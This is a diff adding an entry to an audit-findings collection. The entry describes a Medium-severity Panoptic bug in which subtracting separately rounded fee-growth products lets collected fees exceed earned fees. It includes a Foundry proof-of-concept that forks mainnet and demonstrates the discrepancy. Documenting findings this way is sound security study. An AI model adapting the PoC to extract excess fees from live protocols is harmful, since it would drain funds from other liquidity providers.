@@ -423,3 +423,184 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
 - Impact & Recommendation: Ensure that the collateral token does not have an active freeze authority. If the freeze authority is set to None, the freezing feature is permanently disabled.
 
 <br> 🐬: [Source](https://code4rena.com/reports/2024-04-lavarage#m-01-lack-of-freeze-authority-check-for-collateral-tokens-on-create-trading-pool) & [Report](https://code4rena.com/reports/2024-04-lavarage)
+
+## 10.[Medium] The Main Invariant “Fees paid to a given user should not exceed the amount of fees earned by the liquidity owned by that user.” can be broken due to slight difference when computing collected fee
+
+### Fee calculation
+
+- Summary: The main invariant "Fees paid to a given user should not exceed the amount of fees earned by the liquidity owned by that user" can be broken due to a slight difference in fee computation methods, especially for some tokens with low decimals but worth a lot. **Uniswap V3 Calculation:** `(currFeeGrowth - prevFeeGrowth) * liquidity / Q128` ; **Panoptic Calculation:** `(currFeeGrowth * liquidity / Q128) - (prevFeeGrowth * liquidity / Q128)`
+
+- Impact & Recommendation: Introduce a whitelist to support only those pools where this issue is not significant.
+  <br> 🐬: [Source](https://code4rena.com/reports/2023-11-panoptic#m-03-the-main-invariant-fees-paid-to-a-given-user-should-not-exceed-the-amount-of-fees-earned-by-the-liquidity-owned-by-that-user-can-be-broken-due-to-slight-difference-when-computing-collected-fee) & [Report](https://code4rena.com/reports/2023-11-panoptic)
+
+<details><summary>POC</summary>
+
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+import "forge-std/Test.sol";
+import "forge-std/console.sol";
+import {stdMath} from "forge-std/StdMath.sol";
+import {Errors} from "@libraries/Errors.sol";
+import {Math} from "@libraries/Math.sol";
+import {PanopticMath} from "@libraries/PanopticMath.sol";
+import {CallbackLib} from "@libraries/CallbackLib.sol";
+import {TokenId} from "@types/TokenId.sol";
+import {LeftRight} from "@types/LeftRight.sol";
+import {IERC20Partial} from "@testUtils/IERC20Partial.sol";
+import {TickMath} from "v3-core/libraries/TickMath.sol";
+import {FullMath} from "v3-core/libraries/FullMath.sol";
+import {FixedPoint128} from "v3-core/libraries/FixedPoint128.sol";
+import {IUniswapV3Pool} from "v3-core/interfaces/IUniswapV3Pool.sol";
+import {IUniswapV3Factory} from "v3-core/interfaces/IUniswapV3Factory.sol";
+import {LiquidityAmounts} from "v3-periphery/libraries/LiquidityAmounts.sol";
+import {SqrtPriceMath} from "v3-core/libraries/SqrtPriceMath.sol";
+import {PoolAddress} from "v3-periphery/libraries/PoolAddress.sol";
+import {PositionKey} from "v3-periphery/libraries/PositionKey.sol";
+import {ISwapRouter} from "v3-periphery/interfaces/ISwapRouter.sol";
+import {SemiFungiblePositionManager} from "@contracts/SemiFungiblePositionManager.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {PositionUtils} from "../testUtils/PositionUtils.sol";
+import {UniPoolPriceMock} from "../testUtils/PriceMocks.sol";
+import {ReenterMint, ReenterBurn} from "../testUtils/ReentrancyMocks.sol";
+import {IUniswapV3Pool} from "univ3-core/interfaces/IUniswapV3Pool.sol";
+contract LiquidityProvider {
+    IERC20 constant token0 = IERC20(0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd);
+    IERC20 constant token1 = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
+    function uniswapV3MintCallback(
+        uint256 amount0Owed,
+        uint256 amount1Owed,
+        bytes calldata data
+    ) external {
+        if (amount0Owed > 0) token0.transfer(msg.sender, amount0Owed);
+        if (amount1Owed > 0) token1.transfer(msg.sender, amount1Owed);
+    }
+    function uniswapV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata data
+    ) external {
+        IERC20 token = amount0Delta > 0 ? token0 : token1;
+        uint256 amountToPay = amount0Delta > 0 ? uint256(amount0Delta) : uint256(amount1Delta);
+        token.transfer(msg.sender, amountToPay);
+    }
+    function arbitraryCall(bytes calldata data, address pool) public {
+        (bool success, ) = pool.call(data);
+        require(success);
+    }
+}
+contract CollectFee is Test {
+    address constant GeminiUSDCPool = 0x5aA1356999821b533EC5d9f79c23B8cB7c295C61;
+    address constant GeminiUSD = 0x056Fd409E1d7A124BD7017459dFEa2F387b6d5Cd;
+    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
+    LiquidityProvider Alice;
+    uint160 internal constant MIN_V3POOL_SQRT_RATIO = 4295128739;
+    uint160 internal constant MAX_V3POOL_SQRT_RATIO =
+        1461446703485210103287273052203988822378723970342;
+    uint256 mainnetFork;
+    struct Info {
+        uint128 liquidity;
+        uint256 feeGrowthInside0LastX128;
+        uint256 feeGrowthInside1LastX128;
+        uint128 tokensOwed0;
+        uint128 tokensOwed1;
+    }
+    function setUp() public {
+        // Use your own RPC to fork the mainnet
+        mainnetFork = vm.createFork(
+            "Your RPC"
+        );
+        vm.selectFork(mainnetFork);
+        Alice = new LiquidityProvider();
+        deal(USDC, address(Alice), 1000000 * 1e6);
+        vm.startPrank(address(Alice));
+        IERC20(USDC).approve(GeminiUSDCPool, type(uint256).max);
+        vm.stopPrank();
+    }
+    function testFeeCollectionBreakInvariant() public {
+        // First swap to get some GeminiUSD balance
+        bytes memory AliceSwapData = abi.encodeWithSignature(
+            "swap(address,bool,int256,uint160,bytes)",
+            address(Alice),
+            false,
+            int256(20000 * 1e6),
+            MAX_V3POOL_SQRT_RATIO - 1,
+            ""
+        );
+        Alice.arbitraryCall(AliceSwapData, GeminiUSDCPool);
+        // Then mint some position for Alice, the desired liquidity is 10000000000
+        bytes memory AliceMintData = abi.encodeWithSignature(
+            "mint(address,int24,int24,uint128,bytes)",
+            address(Alice),
+            92100,
+            92200,
+            10000000000,
+            ""
+        );
+        Alice.arbitraryCall(AliceMintData, GeminiUSDCPool);
+        // Now we retrieve the initial feeGrowth for token0(Gemini USD) after minting the position for Alice
+        (
+            uint128 liquidity,
+            uint256 prevFeeGrowthInside0LastX128,
+            uint256 prevFeeGrowthInside1LastX128,
+            ,
+        ) = IUniswapV3Pool(GeminiUSDCPool).positions(
+                keccak256(abi.encodePacked(address(Alice), int24(92100), int24(92200)))
+            );
+        // Then we perform two swaps (both from Gemini USD to USDC, first amount is 4800 USD then 5000 USD)
+        AliceSwapData = abi.encodeWithSignature(
+            "swap(address,bool,int256,uint160,bytes)",
+            address(Alice),
+            true,
+            int256(4800 * 1e2),
+            MIN_V3POOL_SQRT_RATIO + 1,
+            ""
+        );
+        Alice.arbitraryCall(AliceSwapData, GeminiUSDCPool);
+        AliceSwapData = abi.encodeWithSignature(
+            "swap(address,bool,int256,uint160,bytes)",
+            address(Alice),
+            true,
+            int256(5000 * 1e2),
+            MIN_V3POOL_SQRT_RATIO + 1,
+            ""
+        );
+        Alice.arbitraryCall(AliceSwapData, GeminiUSDCPool);
+        // We burn the position of Alice to update feeGrowth for Gemini USD
+        bytes memory AliceBurnData = abi.encodeWithSignature(
+            "burn(int24,int24,uint128)",
+            int24(92100),
+            int24(92200),
+            uint128(10000000000)
+        );
+        Alice.arbitraryCall(AliceBurnData, GeminiUSDCPool);
+        // Now we retrieve the updated feeGrowth for token0(Gemini USD)
+        (
+            uint256 newliquidity,
+            uint256 currFeeGrowthInside0LastX128,
+            uint256 currFeeGrowthInside1LastX128,
+            ,
+        ) = IUniswapV3Pool(GeminiUSDCPool).positions(
+                keccak256(abi.encodePacked(address(Alice), int24(92100), int24(92200)))
+            );
+        // This is how UniV3 compute collected fee: (currFee - prevFee) * liquidity / Q128
+        console.log("Univ3 fee obtained: ");
+        uint256 collectFee = ((currFeeGrowthInside0LastX128 - prevFeeGrowthInside0LastX128) *
+            10000000000) / (2 ** 128);
+        console.log(collectFee);
+        console.log("Panoptic fee1 record: ");
+        uint256 collectFee1 = (currFeeGrowthInside0LastX128 * 10000000000) / (2 ** 128);
+        console.log("Panoptic fee2 record: ");
+        uint256 collectFee2 = (prevFeeGrowthInside0LastX128 * 10000000000) / (2 ** 128);
+        // This is how Panoptic compute collected fee: currFee * liquidity / Q128 - prevFee * liquidity / Q128
+        console.log("Panoptic way to calculate collected fee: ");
+        console.log(collectFee1 - collectFee2);
+        // Then we ensure the fee calculated by Panoptic is larger than UniV3
+        assertGt(collectFee1 - collectFee2, collectFee);
+    }
+}
+
+
+```
+
+</details>
